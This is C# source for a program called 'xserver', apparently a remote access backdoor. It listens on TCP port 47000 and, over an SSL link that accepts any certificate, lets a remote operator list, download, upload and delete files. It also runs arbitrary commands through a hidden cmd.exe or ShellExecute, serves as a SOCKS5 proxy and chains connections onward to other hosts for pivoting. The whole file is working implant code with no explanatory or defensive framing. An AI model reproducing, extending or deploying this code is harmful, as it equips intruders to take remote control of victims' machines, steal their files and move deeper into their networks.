
using System;
using System.Net.Sockets;
using System.Net;
using System.Net.Security;
using System.Threading;
using System.Security.Cryptography.X509Certificates;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.IO.Compression;

public class xserver
{
    static Boolean bConnect = true;
    static int MaxCount = 80;
    static string BindIP = null;
    static string DefaultDir = "";
    static int BUFFER_LEN = 8192;
    static int timer = 0;
    static Boolean bTimer = false;
    static bool ProxySwitch = false;

    [DllImport("shell32.dll")]
    public extern static IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd);

    public struct DirItem
    {
        public Boolean State;
        public ulong mtime;
        public Boolean isDir;
        public ulong filelen;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string filename;
    }

    public struct TransItem
    {
        public int Order;
        public int Speed;
        public Boolean Bzip;
        public ulong Length;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 1024)]
        public string m_path;
    }
    class TransArgs
    {
        public Socket sockClient;
        public IPAddress ip;
        public int port;
        public byte[] prebuf;
    }
    class CDir
    {
        byte[] struct_str;
        ulong msg_length = 292;
        public DirItem msg = new DirItem();
        public CDir(byte[] my_struct_str)
        {
            if (my_struct_str != null)
                struct_str = my_struct_str;
            else
            {
                msg.mtime = 0;
                msg.isDir = false;
                msg.filelen = 0;
                msg.filename = "";
            }
        }
        public void clear()
        {
            msg.mtime = 0;
            msg.isDir = false;
            msg.filelen = 0;
            msg.filename = "";
            msg.State = false;
        }
        public Boolean unpack()
        {
            if (struct_str.Length != 292)
                return false;
            IntPtr structPtr = Marshal.AllocHGlobal(296);
            Marshal.Copy(struct_str, 0, structPtr, struct_str.Length);
            msg = (DirItem)Marshal.PtrToStructure(structPtr, typeof(DirItem));
            Marshal.FreeHGlobal(structPtr);
            return true;
        }
        public byte[] pack()
        {
            byte[] pass = new byte[msg_length];
            IntPtr structPtr = Marshal.AllocHGlobal((int)msg_length);
            Marshal.StructureToPtr(msg, structPtr, false);
            Marshal.Copy(structPtr, pass, 0, (int)msg_length);
            Marshal.FreeHGlobal(structPtr);
            return pass;
        }
    }
    class CTrans
    {
        public TransItem msg = new TransItem();
        public int struct_length = 1048;
        public CTrans(byte[] struct_str)
        {
            if (struct_str == null)
            {
                msg.Order = 0;
                msg.Speed = 0;
                msg.Bzip = true;
                msg.Length = 0;
                msg.m_path = "";
            }
        }
        public void clear()
        {
            msg.Order = 0;
            msg.Speed = 0;
            msg.Bzip = true;
            msg.Length = 0;
            msg.m_path = "";
        }
        public Boolean unpack(byte[] struct_str)
        {
            if (struct_str.Length != 1048)
                return false;
            IntPtr structPtr = Marshal.AllocHGlobal(1048);
            Marshal.Copy(struct_str, 0, structPtr, struct_str.Length);
            msg = (TransItem)Marshal.PtrToStructure(structPtr, typeof(TransItem));
            Marshal.FreeHGlobal(structPtr);
            return true;
        }
        public byte[] pack()
        {
            int size = Marshal.SizeOf(msg);
            byte[] pass = new byte[size];
            IntPtr structPtr = Marshal.AllocHGlobal(size);
            Marshal.StructureToPtr(msg, structPtr, false);
            Marshal.Copy(structPtr, pass, 0, size);
            Marshal.FreeHGlobal(structPtr);
            return pass;
        }

    }
    class SockArgs
    {
        public Socket sock;
        public SslStream ssl_sock;
    }
    static void close_socket(Socket s)
    {
        try
        {
            s.Shutdown(SocketShutdown.Both);
            s.Close();
        }
        catch
        {
        }
    }
    static void SendDirList(SockArgs s, string file_path)
    {
        CDir item = new CDir(null);
        DateTime dt1 = Convert.ToDateTime("1969-12-31 16:00:00");
        string find_path = "";
        string matchstr = "";
        Regex pattern = null;
        if (Directory.Exists(file_path))
            find_path = file_path;
        else if (File.Exists(file_path))
        {
            item.clear();
            FileInfo fp = new FileInfo(file_path);
            item.msg.filelen = (ulong)fp.Length;
            TimeSpan ts = fp.LastWriteTime.Subtract(dt1);
            item.msg.mtime = (ulong)ts.TotalSeconds;
            item.msg.filename = fp.Name;
            item.msg.filename = fp.Name;
            SendPacket(s, item.pack(), 292);
            item.clear();
            item.msg.State = true;
            SendPacket(s, item.pack(), 292);
            return;
        }
        else if (file_path.Contains("*") || file_path.Contains("?"))
        {
            int ix = file_path.LastIndexOf("\\");
            if (ix <= 0)
            {
                item.clear();
                item.msg.State = true;
                SendPacket(s, item.pack(), 292);
                return;
            }
            find_path = file_path.Substring(0, ix);
            matchstr = file_path.Substring(ix + 1);
        }
        else
        {
            item.clear();
            item.msg.State = true;
            SendPacket(s, item.pack(), 292);
            return;
        }
        if (matchstr.Length > 0)
        {
            pattern = new Regex(matchstr.Replace(".", "\\.").Replace("*", ".*").Replace("?", ".?") + "$", RegexOptions.IgnoreCase);
        }
        string[] str_files = Directory.GetFiles(find_path);
        string[] str_Dirs = Directory.GetDirectories(find_path);
        foreach (string name in str_Dirs)
        {
            if (pattern != null)
                if (!pattern.IsMatch(name))
                    continue;
            item.clear();
            string abs_path = Path.GetFullPath(name);
            DirectoryInfo fp = new DirectoryInfo(abs_path);
            item.msg.filelen = 0;
            TimeSpan ts = fp.LastWriteTime.Subtract(dt1);
            item.msg.mtime = (ulong)ts.TotalSeconds;
            item.msg.filename = fp.Name;
            item.msg.isDir = true;
            SendPacket(s, item.pack(), 292);
        }
        foreach (string name in str_files)
        {
            if (pattern != null)
                if (!pattern.IsMatch(name))
                    continue;
            item.clear();
            string abs_path = Path.GetFullPath(name);
            FileInfo fp = new FileInfo(abs_path);
            item.msg.filelen = (ulong)fp.Length;
            TimeSpan ts = fp.LastWriteTime.Subtract(dt1);
            item.msg.mtime = (ulong)ts.TotalSeconds;
            item.msg.filename = fp.Name;
            SendPacket(s, item.pack(), 292);
        }

        item.msg.State = true;
        SendPacket(s, item.pack(), 292);
    }
    static Boolean SendPacket(SockArgs s, byte[] buff, ulong sendsize)
    {
        MemoryStream mstr = new MemoryStream();
        DeflateStream compressedzipStream = new DeflateStream(mstr, CompressionMode.Compress, true);
        compressedzipStream.Write(buff, 0, buff.Length);
        compressedzipStream.Close();
        byte[] send_data = new byte[mstr.Length];
        mstr.Seek(0, SeekOrigin.Begin);
        mstr.Read(send_data, 0, (int)mstr.Length);
        try
        {
            s.ssl_sock.Write(BitConverter.GetBytes((int)mstr.Length));
            s.ssl_sock.Write(send_data, 0, send_data.Length);
        }
        catch
        {
            return false;
        }
        finally
        {
            mstr.Close();
        }
        return true;
    }
    static Boolean PutFileData(SockArgs s, string sourceFile, long Length, int types, ulong lLen, long Speeds, Boolean bZip)
    {
        FileStream fp = null;
        long lSize = Length;
        int nSize = (int)lLen;
        double nCount = 0.0;
        DateTime ntime = DateTime.Now;
        try
        {
            fp = File.Open(sourceFile,FileMode.Open,FileAccess.Read);
            if (Speeds <= 0 || Speeds > 1024 * 1024 * 10)
                Speeds = 1024 * 1024 * 10;
            fp.Seek(nSize, SeekOrigin.Begin);
            while (true)
            {
                byte[] buffdata = new byte[BUFFER_LEN];
                int buf_len = fp.Read(buffdata, 0, BUFFER_LEN);
                Array.Resize(ref buffdata, buf_len);
                if (buf_len <= 0)
                    break;
                nCount += buf_len;
                if (Speeds > 0)
                {
                    if (nCount >= (Speeds * 1024 * 2))
                        Thread.Sleep(System.Math.Abs((2000 - (int)DateTime.Now.Subtract(ntime).TotalMilliseconds)));
                }
                if ((int)DateTime.Now.Subtract(ntime).TotalSeconds > 2)
                {
                    ntime = DateTime.Now;
                    nCount = 0;
                }
                if (bZip)
                    SendPacket(s, buffdata, 00);
                else
                    s.ssl_sock.Write(buffdata);
            }
            return true;
        }
        catch (Exception e)
        {
            close_socket(s.sock);
            Console.WriteLine(e.Message);
            return false;
        }
        finally
        {
            if(fp!=null)
            fp.Close();
        }
    }
    static string GenFileName(string str_file)
    {
        string pref = Path.GetFileNameWithoutExtension(str_file);
        string ext = Path.GetExtension(str_file);
        string path = str_file;
        int index = 0;
        while (File.Exists(path))
        {
            path = pref + "-" + index.ToString("000") + ext;
            index++;
        }
        return path;
    }
    static int GetFileData(SockArgs s, string destFile, long Length, int types, long lLen, Boolean bZip)
    {
        int Result = 2;
        FileStream fp = null;
        try
        {
            if (lLen > 0)
                fp = new FileStream(destFile, FileMode.Append,FileAccess.Write);
            else
                fp = new FileStream(destFile, FileMode.Create,FileAccess.Write);
        }
        catch
        {
            return 0;
        }
        long lSize = Length;
        double nCount = 0.0;
        double nTotal = Length + 0.0;
        DateTime nTime = DateTime.Now;
        lSize -= lLen;

        long bLen = BUFFER_LEN;
        try
        {
            while (lSize > 0)
            {
                byte[] buff = RecvPacket(s, 0);
                long nret = buff.LongLength;
                lSize -= nret;
                nCount += nret;
                if (types == 0)
                {
                    if (DateTime.Now.Subtract(nTime).TotalSeconds > 2)
                    {
                        nTime = DateTime.Now;
                        nCount = 0;
                    }

                }
                fp.Write(buff, 0, buff.Length);
            }
        }
        catch
        {
            Result = 1;
        }
        fp.Close();
        return Result;
    }
    static byte[] RecvPacket(SockArgs s, int size)
    {
        try
        {
            byte[] recv_len = RECV(s.ssl_sock, 4, 6, true, s.sock);
            Int32 re_len = BitConverter.ToInt32(recv_len, 0);
            byte[] Buffdate = RECV(s.ssl_sock, re_len, 6, true, s.sock);
            MemoryStream mst2 = new MemoryStream(Buffdate, 2, Buffdate.Length - 2);
            DeflateStream compressedzipStream = new DeflateStream(mst2, CompressionMode.Decompress);
            MemoryStream OutputStream = new MemoryStream();
            byte[] buff = new byte[1024];
            int readsize;
            while ((readsize = compressedzipStream.Read(buff, 0, 1024)) > 0)
                OutputStream.Write(buff, 0, readsize);
            return OutputStream.ToArray();
        }
        catch
        {
            return null;
        }
    }
    static byte[] RECV(SslStream ssl_sock, int size, int timeout, Boolean bLoop, Socket sock)
    {
        int nRet = 0;
        byte[] Buffer = new byte[size * 2];
        try
        {
            while (nRet < size)
            {
                if (!bConnect)
                {
                    ssl_sock.Close();
                    break;
                }
                if (sock.Poll(size, SelectMode.SelectRead))
                {
                    int ret_size = ssl_sock.Read(Buffer, nRet, size - nRet);
                    nRet += ret_size;
                    if (ret_size <= 0)
                        return null;
                }
                else if (sock.Poll(size, SelectMode.SelectError))
                    return null;
            }
        }
        catch
        {
            ssl_sock.Close();
            return null;
        }
        return Buffer;
    }
    public static bool validataserver(
        object send,
        X509Certificate Certificate,
        X509Chain Chain,
        SslPolicyErrors sslerror)
    {
        return true;
    }
    static void ServerLoopPro(object sock)
    {
        SockArgs s = (SockArgs)sock;
        string CurrentDir = DefaultDir;

        try
        {
            while (true)
            {
                if (!bConnect)
                {
                    s.ssl_sock.Close();
                    break;
                }
                byte[] strpack = RecvPacket((SockArgs)sock, 0);
                CTrans RecvArg = new CTrans(null);
                if (RecvArg.unpack(strpack) == false)
                    continue;
                int Order = RecvArg.msg.Order;
                string file_path = "";
                if (Order != 205)
                {
                    try
                    {
                        file_path = Path.GetFullPath(RecvArg.msg.m_path);
                    }
                    catch
                    {
                        file_path = !RecvArg.msg.m_path.Contains(":\\") ? Directory.GetCurrentDirectory() + "\\" + RecvArg.msg.m_path : RecvArg.msg.m_path;
                    }

                }

                if (Order == 200)  //list
                {
                    SendDirList(s, file_path);
                }
                else if (Order == 201)//download
                {
                    int speeds = RecvArg.msg.Speed;
                    long file_len = 0;
                    if (File.Exists(file_path))
                    {
                        FileInfo f_info = new FileInfo(file_path);
                        file_len = f_info.Length;
                    }
                    else
                        file_len = 0;
                    RecvArg.msg.Length = (ulong)file_len;
                    SendPacket(s, RecvArg.pack(), 22);
                    byte[] tmp_da = RecvPacket(s, 0);
                    RecvArg.unpack(tmp_da);
                    if (RecvArg.msg.Order == 0)
                        continue;

                    PutFileData(s, file_path, 0, 1, RecvArg.msg.Length, speeds, RecvArg.msg.Bzip);
                }
                else if (Order == 202)//upload
                {
                    ulong local_len = 0;
                    ulong remote_len = RecvArg.msg.Length;
                    string TempFile = file_path + ".CT";
                    if (Directory.Exists(TempFile))
                    {
                        FileInfo fp = new FileInfo(TempFile);
                        local_len = (ulong)fp.Length;
                    }
                    RecvArg.clear();
                    SendPacket(s, RecvArg.pack(), 1048);
                    if (GetFileData(s, TempFile, (long)remote_len, 1, (long)local_len, RecvArg.msg.Bzip) == 2)
                    {
                        string SaveFile = GenFileName(file_path);
                        FileInfo fp = new FileInfo(TempFile);
                        fp.MoveTo(SaveFile);
                    }
                }
                else if (Order == 204)//del
                {
                    int resCode = 0;
                    if (Directory.Exists(file_path))
                        resCode = 400;
                    else if (!File.Exists(file_path))
                        resCode = 403;
                    else
                    {
                        try
                        {
                            File.Delete(file_path);
                            resCode = 1;
                        }
                        catch
                        {
                            resCode = 0;
                        }

                    }
                    s.ssl_sock.Write(BitConverter.GetBytes(resCode));
                }
                else if (Order == 205)//exec
                {
                    CTrans sendData = new CTrans(null);
                    string m_path = "cd /d " + CurrentDir + " & " + RecvArg.msg.m_path;
                    if (!RecvArg.msg.Bzip)
                    {
                        sendData.msg.Order = 205;
                        string[] strs = RecvArg.msg.m_path.Trim().Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                        RecvArg.msg.m_path = string.Join(" ", strs);
                        string exe_name;
                        string lpParameters;
                        int index = RecvArg.msg.m_path.IndexOf(' ');
                        if (index > 0)
                        {
                            exe_name = RecvArg.msg.m_path.Substring(0, index);
                            lpParameters = RecvArg.msg.m_path.Substring(index);
                        }
                        else
                        {
                            exe_name = RecvArg.msg.m_path;
                            lpParameters = null;
                        }
                        try
                        {
                            IntPtr result;
                            result = ShellExecute(IntPtr.Zero, "open", exe_name, lpParameters, null, 0);
                            sendData.msg.Order = (int)result >= 32 ? 205 : 0;
                            sendData.msg.m_path = (int)result >= 32 ? "" : "Error command:" + RecvArg.msg.m_path;
                        }
                        catch
                        {
                            sendData.msg.Order = 0;
                            sendData.msg.m_path = "Other error.";
                        }
                        SendPacket(s, sendData.pack(), 1048);
                        continue;
                    }
                    ProcessStartInfo start = new ProcessStartInfo("cmd.exe");
                    start.Arguments = "/c " + m_path;
                    start.CreateNoWindow = true;
                    start.RedirectStandardOutput = true;
                    start.RedirectStandardInput = true;
                    start.UseShellExecute = false;
                    start.RedirectStandardError = true;
                    Process p = Process.Start(start);
                    StreamReader reader = p.StandardOutput;
                    string line = reader.ReadLine();
                    string m_result = line + "\r\n";
                    while (!reader.EndOfStream)
                    {
                        line = reader.ReadLine();
                        m_result += (line + "\r\n");
                    }
                    reader.Close();
                    reader = p.StandardError;
                    while (!reader.EndOfStream)
                    {

                        line = reader.ReadLine();
                        m_result += (line + "\r\n");
                    }
                    p.Close();
                    reader.Close();
                    if (m_result != null && m_result.Length >= 1)
                    {
                        int index = 0;
                        while (index < m_result.Length)
                        {

                            sendData.clear();
                            sendData.msg.Order = 205;
                            int send_size = m_result.Length - index > 800 ? 800 : m_result.Length - index;
                            sendData.msg.m_path = m_result.Substring(index, send_size);
                            index += send_size;
                            try
                            {
                                SendPacket(s, sendData.pack(), 1048);
                            }
                            catch { }
                        }
                    }
                    sendData.clear();
                    sendData.msg.Order = 0;
                    SendPacket(s, sendData.pack(), 1048);
                }
                else if (Order == 206)//read interval
                {
                    int nClose = 0;
                    if (bTimer)
                        nClose = timer / 60;
                    s.ssl_sock.Write(BitConverter.GetBytes(nClose));
                    continue;
                }
                else if (Order == 207)//set interval
                {
                    int nRet = 0;
                    if (RecvArg.msg.Speed > 1)
                        if (bTimer)
                        {
                            nRet = 1;
                            timer = RecvArg.msg.Speed * 60;
                        }
                    s.ssl_sock.Write(BitConverter.GetBytes(nRet));
                    continue;
                }
                else if (Order == 208)//change dir
                {
                    int nRet = 0;
                    if (Directory.Exists(RecvArg.msg.m_path))
                    {
                        nRet = 1;
                        CurrentDir = Path.GetFullPath(RecvArg.msg.m_path);
                    }
                    DefaultDir = CurrentDir;
                    Directory.SetCurrentDirectory(DefaultDir);
                    s.ssl_sock.Write(BitConverter.GetBytes(nRet));
                }
                else if (Order == 209)//process list
                {
                    ;
                }
                else if (Order == 210)//pwd
                {
                    RecvArg.clear();
                    RecvArg.msg.Order = Order;
                    RecvArg.msg.m_path = CurrentDir;
                    SendPacket(s, RecvArg.pack(), (ulong)RecvArg.struct_length);
                }
                else if (Order == 211)
                {
                    if(RecvArg.msg.Bzip == false)
                    {
                        s.ssl_sock.Write(BitConverter.GetBytes(Convert.ToInt32(ProxySwitch)));
                    }
                    else{
                        ProxySwitch = Convert.ToBoolean(RecvArg.msg.Speed);
                        s.ssl_sock.Write(BitConverter.GetBytes(Convert.ToInt32(ProxySwitch)));
                    }
                }
                else if (Order == 999)//
                {
                    s.ssl_sock.Write(BitConverter.GetBytes((long)999));
                }
                else
                    s.ssl_sock.Write(System.Text.Encoding.Default.GetBytes("Error, Byebye!\n"));
            }
            s.ssl_sock.Close();
            close_socket(s.sock);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: {0}", ex.Message);
        }
        return;
    }
    static void TransmitData(object arg)
    {
        TransArgs args = (TransArgs)arg;
        Socket other = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        try
        {
            other.Connect(args.ip, args.port);
        }
        catch
        {
            close_socket(other);
            return;
        }
        if (args.prebuf != null && args.prebuf.Length > 0)
            other.Send(args.prebuf);
        int recv_size;
        byte[] buff = new byte[20480];
        while (bConnect)
        {
            try
            {
                if (args.sockClient.Poll(1000, SelectMode.SelectRead))
                {
                    Array.Clear(buff, 0, buff.Length);
                    recv_size = args.sockClient.Receive(buff);
                    if (recv_size == 0)
                        break;
                    else
                        other.Send(buff, 0, recv_size, 0);
                }
                if (other.Poll(1000, SelectMode.SelectRead))
                {
                    Array.Clear(buff, 0, buff.Length);
                    recv_size = other.Receive(buff);
                    if (recv_size == 0)
                        break;
                    else
                        args.sockClient.Send(buff, 0, recv_size, 0);
                }
            }
            catch
            {
                break;
            }
        }
        close_socket(other);
        close_socket(args.sockClient);
    }
    static void ForwardTransmit(object args)
    {
        TransArgs FTa = (TransArgs)args;

        if (FTa.prebuf == null)
        {
            FTa.sockClient.Receive(FTa.prebuf, 2, SocketFlags.None);
        }
        try
        {
            if (FTa.prebuf[0] != 0x17)
            {
                FTa.sockClient.Close();
                return;
            }
            if (FTa.prebuf[1] > 0)
            {
                byte[] infobuf = new byte[6 * FTa.prebuf[1]];
                FTa.sockClient.Receive(infobuf,infobuf.Length,SocketFlags.None);
                byte[] next_ip = new byte[4];

                Array.Copy(infobuf, next_ip, 4);
                byte[] port = new byte[2] { infobuf[5], infobuf[4] };
                FTa.prebuf[1] -= 1;
                byte[] head = new byte[2 + FTa.prebuf[1] * 6];
                if (FTa.prebuf[1] > 0)
                {
                    head[0] = 0x17;
                    head[1] = FTa.prebuf[1];
                    Array.Copy(infobuf, 6, head, 2, FTa.prebuf[1] * 6);
                }
                else
                {
                    Array.Resize(ref head, 0);
                }
                FTa.prebuf = head;
                FTa.port = BitConverter.ToUInt16(port,0);
                FTa.ip = IPAddress.Parse(next_ip[0].ToString()+"."+ next_ip[1].ToString() + "." + next_ip[2].ToString()+"."+ next_ip[3].ToString());
                TransmitData(FTa);
            }
            else
                FTa.sockClient.Close();
        }
        catch
        {
            ;
        }
    }

    public static void reply_error(Socket s)
    {
        try
        {
            byte[] reply = new byte[] { 0x05, 0x05, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
            s.Send(reply);
            s.Shutdown(SocketShutdown.Both);
            s.Close();
        }
        catch { }
        return;
    }

    public static void ProxyTransmit(object args)
    {
        TransArgs item = (TransArgs)args;
        byte[] RecvBuf = new byte[1024];
        Socket CliSock = item.sockClient;
        IPAddress ip = new IPAddress(0);
        int Port = 0;
        byte[] buf = new byte[1024];
        int Len = 0;
        try
        {
            byte Ver = item.prebuf[0];
            if (Ver != 0x05)
            {
                reply_error(CliSock);
                return;
            }
            byte tnum = item.prebuf[1];
            CliSock.Receive(buf, 0, tnum, SocketFlags.None);
            if(buf[0] != 0)
            {
                reply_error(CliSock);
                return;
            }
            CliSock.Send(new byte[] { 0x05, 0x00 });
        }
        catch
        {
            return;
        }
        
        byte[] reply = new byte[] { 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
        try
        {
            Len = CliSock.Receive(RecvBuf);
            byte CMD = RecvBuf[1];
            byte ATYP = RecvBuf[3];
            if (CMD == 0x01)
            {
                if (ATYP == 0x01)
                {
                    byte[] Addr = new byte[4];
                    Buffer.BlockCopy(RecvBuf, 4, Addr, 0, 4);
                    String sip = "";
                    foreach (byte b in Addr)
                    {
                        sip += b.ToString() + ".";
                    }
                    IPAddress[] ips = Dns.GetHostAddresses(sip.Remove(sip.Length - 1));
                    ip = ips[0];
                    Port = 256 * RecvBuf[8] + RecvBuf[9];
                }
                else if (ATYP == 0x03)
                {
                    byte AddrLen = RecvBuf[4];
                    byte[] Addr = new byte[AddrLen];
                    Buffer.BlockCopy(RecvBuf, 5, Addr, 0, AddrLen);
                    String HostName = System.Text.Encoding.Default.GetString(Addr);
                    IPAddress[] ips = Dns.GetHostAddresses(HostName);
                    ip = ips[0];
                    Port = 256 * RecvBuf[AddrLen + 5] + RecvBuf[AddrLen + 6];
                }
                else
                {
                    reply_error(CliSock);
                    return;
                }  
            }
        }
        catch
        {
            reply_error(CliSock);
            return;
        }

        try
        {
            CliSock.Send(reply);
            TransArgs targ = new TransArgs();
            targ.sockClient = CliSock;
            targ.ip = ip;
            targ.port = Port;

            TransmitData(targ);
        }
        catch
        {
            reply_error(CliSock);
            return;
        }
    }

    static void ServerX(int ListenPort)
    {
        Socket sockSrv = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        try
        {
            string ip = BindIP == null ? "0.0.0.0" : BindIP;
            sockSrv.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
            sockSrv.Bind(new IPEndPoint(IPAddress.Parse(ip), ListenPort));
            sockSrv.Listen(MaxCount);
        }
        catch
        {
            bConnect = false;
            return;
        }
        if (DefaultDir.Length <= 0)
            DefaultDir = System.Environment.CurrentDirectory;
        while (true)
        {
            if (!bConnect)
            {
                close_socket(sockSrv);
                break;
            }
            if (sockSrv.Poll(1000, SelectMode.SelectRead))
            {
                try
                {
                    Socket ClientSock = sockSrv.Accept();
                    if (ClientSock == null)
                        continue;

                    byte[] prebuf = new byte[2];
                    ClientSock.Receive(prebuf, 2, SocketFlags.None);

                    if (prebuf[0] == '\x05' && ProxySwitch == true)
                    {
                        TransArgs args = new TransArgs();
                        args.sockClient = ClientSock;
                        args.prebuf = prebuf;
                        Thread td = new Thread(ProxyTransmit);
                        td.Start(args);
                        continue;
                    }
                    else if (prebuf[0] == '\x17')
                    {
                        TransArgs args = new TransArgs();
                        args.sockClient = ClientSock;
                        args.prebuf = prebuf;
                        Thread td = new Thread(ForwardTransmit);
                        td.Start(args);
                        continue;
                    }
                    else if (prebuf[0] != 0x18)
                    {
                        if (BindIP != null)
                        {
                            TransArgs args = new TransArgs();
                            args.sockClient = ClientSock;
                            args.ip = IPAddress.Parse("127.0.0.1");
                            args.port = ListenPort;
                            args.prebuf = prebuf;
                            Thread td = new Thread(TransmitData);
                            td.Start(args);
                            continue;
                        }
                        else
                        {
                            ClientSock.Close();
                            continue;
                        }
                    }

                    SslStream Ssl_client = new SslStream(new NetworkStream(ClientSock), false, new RemoteCertificateValidationCallback(validataserver), null);
                    Ssl_client.AuthenticateAsClient("Root");

                    SockArgs sock_param = new SockArgs();
                    sock_param.sock = ClientSock;
                    sock_param.ssl_sock = Ssl_client;
                    string re_info = "WIN|" + Directory.GetCurrentDirectory();
                    SendPacket(sock_param, System.Text.Encoding.Default.GetBytes(re_info), 0);
                    Thread tx = new Thread(ServerLoopPro);
                    tx.Start(sock_param);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    continue;
                }

            }
            if (sockSrv.Poll(1000, SelectMode.SelectError))
            {
                break;
            }

        }
    }
    static void settimer()
    {
        while (timer > 0)
        {
            if (!bConnect)
                break;
            Thread.Sleep(1 * 1000);
            timer--;
        }
        bConnect = false;
        bTimer = false;
    }
    
    public static void Main(string[] args)
    {
        BindIP = null;
        int ListenPort = 47000;

        int intval = 0;
        if (intval > 0)
        {
            timer = intval * 60;
            bTimer = true;
            Thread tx = new Thread(settimer);
            tx.Start();
        }
        if (ListenPort > 0)
        {
            ServerX(ListenPort);
        }

        return;
    }

}
